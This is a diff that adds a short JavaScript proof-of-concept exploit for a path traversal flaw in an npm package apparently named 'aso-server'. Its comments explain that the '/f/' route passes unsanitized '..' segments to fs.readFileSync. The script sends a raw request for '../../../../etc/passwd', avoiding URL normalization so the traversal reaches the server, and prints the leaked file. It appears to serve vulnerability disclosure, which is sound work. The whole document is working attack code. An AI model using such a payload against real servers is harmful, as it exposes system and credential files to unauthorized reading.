@@ -1,0 +1,28 @@
+```javascript
+// Path traversal / arbitrary file read in aso-server (server.js)
+// The "/f/<path>" route passes the decoded URL path straight into
+// fs.readFileSync() with no sanitization of ".." segments, allowing
+// reads of any file on disk reachable from the process's permissions.
+const http = require("http");
+const server = require("aso-server");
+
+server.start("127.0.0.1", 4321, () => {
+  const target = "../../../../../../../../etc/passwd";
+
+  // Use http.request (not http.get/new URL) so the ".." segments in the
+  // path are sent to the server verbatim instead of being normalized away.
+  const req = http.request(
+    { hostname: "127.0.0.1", port: 4321, path: `/f/${target}`, method: "GET" },
+    (res) => {
+      let body = "";
+      res.on("data", (d) => (body += d));
+      res.on("end", () => {
+        console.log("Status:", res.statusCode);
+        console.log(body); // contents of /etc/passwd leaked
+        server.stop();
+      });
+    }
+  );
+  req.end();
+});
+```
